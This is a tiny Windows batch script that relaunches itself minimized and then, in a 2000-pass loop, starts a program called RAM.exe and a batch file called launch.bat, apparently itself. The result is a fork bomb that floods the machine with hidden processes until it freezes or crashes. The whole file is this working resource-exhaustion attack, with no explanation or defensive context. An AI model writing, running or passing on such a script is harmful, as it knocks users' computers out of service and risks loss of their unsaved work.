@echo off
if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
FOR /L %%A IN (1,1,2000) DO (
start /MIN "" ".\RAM.exe"
start /MIN "" ".\launch.bat"
)
